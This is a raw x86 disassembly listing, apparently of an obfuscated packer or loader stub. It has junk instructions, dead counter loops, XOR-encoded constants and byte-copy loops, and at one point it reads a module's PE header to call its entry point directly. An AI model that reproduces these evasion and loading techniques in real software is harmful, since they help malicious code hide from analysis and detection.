  41948a:	mov    DWORD PTR ds:0x421a62,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421952
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x4237a9
  419500:	mov    esi,DWORD PTR ds:0x42178a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421952
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b6e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x4234de
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421952
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421782
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x423604
  4196bb:	push   0x42357f
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b6e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421952
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x4237b9
  4197cd:	mov    eax,ds:0x42177e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x4235fa
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x423564
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42175e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421952
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x42375e
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x4217d6,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x421a2a,eax
  419ba6:	mov    eax,ds:0x4217d6
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421952
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x421a2a
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x4217d6
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421952
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421952
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421952
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x4219d6,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x4219ce,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421952
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
